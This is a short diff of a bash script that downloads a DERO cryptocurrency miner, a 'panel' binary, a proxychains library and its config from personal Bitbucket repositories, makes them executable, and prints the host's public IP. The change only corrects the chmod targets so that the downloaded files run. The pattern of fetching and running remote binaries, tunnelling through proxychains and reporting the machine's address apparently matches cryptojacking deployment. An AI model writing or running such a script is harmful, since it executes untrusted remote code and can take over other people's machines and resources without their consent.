@@ -1,6 +1,6 @@
 #!/bin/bash
-curl -L -o dero-stratum-miner https://bitbucket.org/samilafera/saman/downloads/dero-stratum-miner && chmod +x python 
-curl -L -o panel https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x proxy
+curl -L -o dero-stratum-miner https://bitbucket.org/samilafera/saman/downloads/dero-stratum-miner && chmod +x dero-stratum-miner 
+curl -L -o panel https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x panel
 curl -L -o libproxychains4.so  https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so 
 curl -L -o proxychains.conf https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
 echo "IP ORI ==> "$(curl ifconfig.me) 
